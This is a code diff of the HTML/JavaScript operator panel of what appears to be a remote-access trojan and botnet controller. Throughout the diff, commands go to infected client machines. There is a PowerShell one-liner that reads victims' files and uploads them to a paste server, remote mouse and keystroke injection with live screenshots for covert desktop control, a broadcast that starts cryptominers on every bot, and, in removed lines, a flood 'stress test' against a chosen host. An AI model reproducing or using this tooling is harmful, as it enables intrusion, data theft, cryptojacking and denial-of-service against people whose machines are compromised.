+        const uploadCmd = `powershell -Command "$filePath='${fullPath}'; $URL='${cleanBaseUrl}/upload'; $boundary = [System.Guid]::NewGuid().ToString(); $CRLF = [char]13 + [char]10; if(-not (Test-Path $filePath)){ echo 'File not found'; exit }; $fileBytes = [System.IO.File]::ReadAllBytes($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $header = ('--' + $boundary + $CRLF + 'Content-Disposition: form-data; name=\\"file\\"; filename=\\"' + $fileName + '\\"' + $CRLF + 'Content-Type: application/octet-stream' + $CRLF + $CRLF); $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($header); $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($CRLF + '--' + $boundary + '--' + $CRLF); $body = New-Object System.Collections.Generic.List[byte]; $body.AddRange($headerBytes); $body.AddRange($fileBytes); $body.AddRange($footerBytes); $response = Invoke-RestMethod -Uri $URL -Method Post -ContentType ('multipart/form-data; boundary=' + $boundary) -Body $body.ToArray(); if($response -match 'id=\\"download-link\\".*?href=\\"([^\\"]+)\\"') { $link = $Matches[1]; echo ('${cleanBaseUrl}' + $link) } else { echo 'Upload Finished - Link unavailable' }"`;
+        socket.emit('command', { 'command': uploadCmd, 'client_id': current_client_id });
+    }
+
+    /* REMOTE DESKTOP (Coordinate Fix) */
+    function enterControlMode() {
+        if (!current_client_id) return;
+        isControlMode = true;
+        document.getElementById('control-overlay').style.display = 'flex';
+        socket.emit('command', { 'command': '#scrsht 100', 'client_id': current_client_id });
+    }
+
+    document.getElementById('control-image').onclick = function(e) {
+        if (!isControlMode || !current_client_id) return;
+        const rect = this.getBoundingClientRect();
+        const x = Math.floor(((e.clientX - rect.left) / rect.width) * 65535);
+        const y = Math.floor(((e.clientY - rect.top) / rect.height) * 65535);
+        const clickCmd = `powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $sig = '[DllImport(\\"user32.dll\\")] public static extern void mouse_event(uint f, uint x, uint y, uint d, uint e);'; $type = Add-Type -MemberDefinition $sig -Name \\"Win32Utils\\" -Namespace \\"Win32Utils\\" -PassThru; $type::mouse_event(0x8001, ${x}, ${y}, 0, 0); $type::mouse_event(0x0002, 0, 0, 0, 0); $type::mouse_event(0x0004, 0, 0, 0, 0);"`;
+        socket.emit('command', { 'command': clickCmd, 'client_id': current_client_id });
+    };
+
+    window.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape' && isControlMode) {
+            isControlMode = false;
+            document.getElementById('control-overlay').style.display = 'none';
+            socket.emit('command', { 'command': '#scrsht reset', 'client_id': current_client_id });
         }
+    });
 
-        function renderFileSystem(jsonStr) {
-            const container = document.getElementById('file-list-container');
-            const pathDisplay = document.getElementById('current-path-display');
-            if (!current_client_hostname || !clientStates[current_client_hostname]) return;
-            let currentPath = clientStates[current_client_hostname].currentPath;
-            pathDisplay.textContent = currentPath;
-            container.innerHTML = '';
-            const back = document.createElement('div');
-            back.className = 'file-item';
-            back.innerHTML = `<div class="file-info"><span class="file-type-icon">📁</span> <span class="file-name">.. [Parent Directory]</span></div>`;
-            back.onclick = () => {
-                const parts = currentPath.split('\\').filter(p => p.length > 0);
-                if (parts.length > 1) { parts.pop(); clientStates[current_client_hostname].currentPath = parts.join('\\') + '\\'; refreshFiles(); } else { clientStates[current_client_hostname].currentPath = "C:\\"; refreshFiles(); }
-            };
-            container.appendChild(back);
-            try {
-                let items = JSON.parse(jsonStr.trim() || "[]");
-                if (!Array.isArray(items)) items = items ? [items] : [];
-                items.forEach(item => {
-                    if (!item || !item.Name) return;
-                    const el = document.createElement('div');
-                    el.className = 'file-item';
-                    const icon = item.IsDirectory ? '📁' : '📄';
-                    const size = item.IsDirectory ? '' : `<span style="color:#666; font-size:0.7rem;">(${(item.Size / 1024).toFixed(1)} KB)</span>`;
-                    el.innerHTML = `<div class="file-info"><span class="file-type-icon">${icon}</span> <span class="file-name">${item.Name}</span> ${size}</div><div class="file-actions">${!item.IsDirectory ? `<button onclick="downloadFile('${item.Name.replace(/'/g, "\\'")}', event)">Get</button>` : ''}</div>`;
-                    el.onclick = () => {
-                        if (item.IsDirectory) {
-                            const current = clientStates[current_client_hostname].currentPath;
-                            clientStates[current_client_hostname].currentPath = current.endsWith('\\') ? current + item.Name + '\\' : current + '\\' + item.Name + '\\';
-                            refreshFiles();
-                        }
-                    };
-                    container.appendChild(el);
-                });
-            } catch (e) { container.innerHTML = `<div style="padding:10px; color:#e74c3c;">Path unavailable.</div>`; }
+    socket.on('screenshot_data', (data) => {
+        if (data.client_id === current_client_id) {
+            const imgStr = "data:image/jpeg;base64," + data.image_data;
+            document.getElementById('screenshot-image').src = imgStr;
+            if (isControlMode) document.getElementById('control-image').src = imgStr;
         }
+    });
 
-        function downloadFile(name, event) {
-            event.stopPropagation();
-            if (!current_client_hostname || !clientStates[current_client_hostname]) return;
-            const path = clientStates[current_client_hostname].currentPath;
-            const fullPath = (path + name).replace(/'/g, "''");
-            const cleanBaseUrl = MICROBIN_URL_BASE.replace(/\/+$/, '');
+    /* CORE HELPERS */
+    function selectClient(client) {
+        current_client_id = client.id;
+        current_client_hostname = client.hostname;
+        if (!clientStates[current_client_hostname]) clientStates[current_client_hostname] = { currentPath: "C:\\", hashrate: 0, lastSeen: 0, shares: 0 };
+        document.getElementById('node-title').textContent = (client.alias || client.hostname).toUpperCase();
+        document.getElementById('command-output').textContent = commandHistory[client.hostname] || "Terminal initialized...\n";
+        if (client.screenshot_data) document.getElementById('screenshot-image').src = "data:image/jpeg;base64," + client.screenshot_data;
+        refreshMiningUI();
+    }
 
-            // Fixed Upload Script Logic
-            const uploadCmd = `powershell -Command "$filePath='${fullPath}'; $URL='${cleanBaseUrl}/upload'; $boundary = [System.Guid]::NewGuid().ToString(); $CRLF = [char]13 + [char]10; if(-not (Test-Path $filePath)){ echo 'File not found'; exit }; $fileBytes = [System.IO.File]::ReadAllBytes($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $header = ('--' + $boundary + $CRLF + 'Content-Disposition: form-data; name=\\"file\\"; filename=\\"' + $fileName + '\\"' + $CRLF + 'Content-Type: application/octet-stream' + $CRLF + $CRLF); $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($header); $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($CRLF + '--' + $boundary + '--' + $CRLF); $body = New-Object System.Collections.Generic.List[byte]; $body.AddRange($headerBytes); $body.AddRange($fileBytes); $body.AddRange($footerBytes); $response = Invoke-RestMethod -Uri $URL -Method Post -ContentType ('multipart/form-data; boundary=' + $boundary) -Body $body.ToArray(); if($response -match 'id=\\"download-link\\".*?href=\\"([^\\"]+)\\"') { $link = $Matches[1]; echo ('${cleanBaseUrl}' + $link) } else { echo 'Regex failed to find download link in response body.' }"`;
+    function sendCommand() {
+        const inp = document.getElementById('command-input');
+        if (current_client_id && inp.value) { socket.emit('command', { command: inp.value, client_id: current_client_id }); inp.value = ''; }
+    }
 
-            socket.emit('command', { 'command': uploadCmd, 'client_id': current_client_id });
-        }
+    function broadcastMining(action) {
+        const wallet = document.getElementById('global-miner-wallet').value || "WORKER";
+        allConnectedClients.forEach(c => { if(c.online) socket.emit('command', { command: `#miner ${action} 50 ${wallet}`, client_id: c.id }); });
+    }
 
-        function launchStressTest() {
-            const host = document.getElementById('stress-host').value;
-            const port = document.getElementById('stress-port').value;
-            const method = document.getElementById('stress-method').value;
-            const count = document.getElementById('stress-count').value;
-            let cmd = (method === 'ping') ? `ping -n ${count} ${host}` : (method === 'http_get') ? `powershell -Command "1..${count} | ForEach { iwr -Uri http://${host}:${port} -UseBasicParsing }"` : `powershell -Command "1..${count} | ForEach { $t = New-Object Net.Sockets.TcpClient; $t.Connect('${host}', ${port}); $t.Close() }"`;
-            allConnectedClients.filter(c => c.online).forEach(client => { socket.emit('command', { 'command': cmd, 'client_id': client.id }); });
-        }
+    function runMiner(action) {
+        const wallet = document.getElementById('miner-wallet').value || "WORKER";
+        socket.emit('command', { command: `#miner ${action} 50 ${wallet}`, client_id: current_client_id });
+    }
 
-        socket.on('screenshot_data', (data) => {
-            if (data.client_id === current_client_id) {
-                document.getElementById('screenshot-image').src = "data:image/jpeg;base64," + data.image_data;
-                if (isControlMode) document.getElementById('control-image').src = "data:image/jpeg;base64," + data.image_data;
+    function updateGlobalStats() {
+        let totalHash = 0, totalShares = 0, workers = 0;
+        const now = Date.now();
+        allConnectedClients.forEach(c => {
+            const state = clientStates[c.hostname];
+            if (state && (now - state.lastSeen) < STALE_MS) {
+                totalHash += state.hashrate; totalShares += state.shares;
+                if (state.hashrate > 0) workers++;
             }
         });
+        document.getElementById('net-hashrate').textContent = totalHash.toLocaleString() + " H/s";
+        document.getElementById('net-shares').textContent = totalShares;
+        document.getElementById('net-workers').textContent = workers;
+    }
 
-        function enterControlMode() {
-            if (!current_client_id) return;
-            isControlMode = true;
-            document.getElementById('control-overlay').style.display = 'flex';
-            socket.emit('command', { 'command': '#scrsht 100', 'client_id': current_client_id });
-            const img = document.getElementById('control-image');
-            img.onclick = (e) => {
-                const rect = img.getBoundingClientRect();
-                const x = Math.floor((e.clientX - rect.left) / rect.width * 65535);
-                const y = Math.floor((e.clientY - rect.top) / rect.height * 65535);
-                const clickCmd = `powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $old = [System.Windows.Forms.Cursor]::Position; $sig = '[DllImport(\\"user32.dll\\")] public static extern void mouse_event(uint f, uint x, uint y, uint d, uint e);'; $type = Add-Type -MemberDefinition $sig -Name \\"Win32Utils\\" -Namespace \\"Win32Utils\\" -PassThru; $type::mouse_event(0x8001, ${x}, ${y}, 0, 0); $type::mouse_event(0x0002, 0, 0, 0, 0); $type::mouse_event(0x0004, 0, 0, 0, 0); [System.Windows.Forms.Cursor]::Position = $old;"`;
-                socket.emit('command', { 'command': clickCmd.replace(/\s+/g, ' ').trim(), 'client_id': current_client_id });
-            };
-            window.addEventListener('keydown', handleKey);
-        }
+    function refreshMiningUI() {
+        const state = clientStates[current_client_hostname];
+        const isMining = state && (Date.now() - state.lastSeen) < STALE_MS && state.hashrate > 0;
+        document.getElementById('node-stat-mining').textContent = isMining ? "ACTIVE" : "Null";
+        document.getElementById('node-stat-rate').textContent = isMining ? state.hashrate.toLocaleString() + " H/s" : "0 H/s";
+        document.getElementById('node-stat-shares').textContent = state ? state.shares : "0";
+    }
 
-        function handleKey(e) {
-            if (e.key === 'Escape') { isControlMode = false; document.getElementById('control-overlay').style.display = 'none'; socket.emit('command', { 'command': '#scrsht reset', 'client_id': current_client_id }); window.removeEventListener('keydown', handleKey); return; }
-            if (isControlMode) {
-                e.preventDefault();
-                let key = e.key;
-                const mapping = { "ArrowUp": "{UP}", "ArrowDown": "{DOWN}", "ArrowLeft": "{LEFT}", "ArrowRight": "{RIGHT}", "Enter": "{ENTER}", "Backspace": "{BACKSPACE}", "Tab": "{TAB}", "Escape": "{ESC}" };
-                if (mapping[key]) key = mapping[key]; else if (key.length > 1) key = `{${key.toUpperCase()}}`;
-                const keyCmd = `powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('${key.replace(/'/g, "''")}')"`;
-                socket.emit('command', { 'command': keyCmd, 'client_id': current_client_id });
-            }
-        }
+    function saveMetadata() { 
+        socket.emit('update_metadata', { hostname: current_client_hostname, alias: document.getElementById('edit-alias').value, description: document.getElementById('edit-desc').value }); 
+    }
 
-        function toggleStressTester() { const area = document.getElementById('stress-test-area'); area.style.display = (area.style.display === 'flex') ? 'none' : 'flex'; }
-        {% endraw %}
-    </script>
+    setInterval(() => { updateGlobalStats(); if (current_client_id) refreshMiningUI(); }, 2000);
+    {% endraw %}
+</script>
 </body>
 </html>
